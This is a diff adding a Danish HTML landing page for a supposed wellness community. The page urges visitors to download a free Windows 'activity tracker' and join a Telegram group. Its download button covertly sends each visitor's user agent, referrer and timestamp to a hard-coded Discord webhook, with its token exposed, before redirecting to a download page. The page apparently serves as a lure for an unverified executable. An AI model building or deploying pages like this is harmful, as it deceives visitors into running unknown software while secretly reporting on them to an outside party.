@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Holistisk Wellness Danmark - Officiel Side</title>
+    <meta name="description" content="Danmarks største community for yoga, meditation og holistisk wellness. Download vores gratis wellness tracker!">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0; line-height: 1.6; color: #333;
+        }
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white; text-align: center; padding: 2rem 0;
+        }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        .cta-section {
+            background: #f8f9fa; padding: 40px 20px; text-align: center;
+            margin: 40px 0; border-radius: 10px;
+        }
+        .btn {
+            display: inline-block; padding: 15px 30px; background: #0088cc;
+            color: white; text-decoration: none; border-radius: 25px;
+            font-weight: bold; margin: 10px; border: none; cursor: pointer;
+        }
+        .btn:hover { background: #006fa3; }
+        .app-download {
+            background: #28a745; padding: 30px; border-radius: 15px;
+            color: white; margin: 30px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🧘‍♀️ Holistisk Wellness Danmark</h1>
+        <p>Danmarks største community for yoga, meditation og wellness</p>
+    </div>
+    
+    <div class="container">
+        <div class="app-download">
+            <h2>🏃‍♀️ NY: Wellness Activity Tracker</h2>
+            <p>Download vores brandnye Windows-app til at tracke dine wellness aktiviteter!</p>
+            <ul style="text-align: left; max-width: 400px; margin: 20px auto;">
+                <li>🧘 Automatisk meditation tracking</li>
+                <li>📊 Wellness statistikker og trends</li>
+                <li>🌿 Daglige wellness tips direkte til din desktop</li>
+                <li>💚 Integration med vores Telegram community</li>
+            </ul>
+            <button class="btn" onclick="downloadApp()" style="background: white; color: #28a745; font-size: 18px;">
+                📥 Download til Windows (Gratis)
+            </button>
+        </div>
+        
+        <div class="cta-section">
+            <h2>Bliv en del af fællesskabet</h2>
+            <p>Join vores aktive Telegram-gruppe med 1200+ medlemmer:</p>
+            <button class="btn" onclick="joinTelegram()">🔗 Join Telegram Community</button>
+        </div>
+    </div>
+    
+    <script>
+        function downloadApp() {
+            // Track download
+            fetch('https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🎯 **App Download Initiated**\n**User:** ${navigator.userAgent}\n**Referrer:** ${document.referrer}\n**Time:** ${new Date().toISOString()}`
+                })
+            }).catch(() => {});
+            
+            // Redirect to download page
+            window.location.href = 'wellness_tracker_download.html';
+        }
+        
+        function joinTelegram() {
+            window.open('https://t.me/+YxJbAUDzpzEAAQAAAG82W3tzhTzY', '_blank');
+        }
+    </script>
+</body>
+</html>
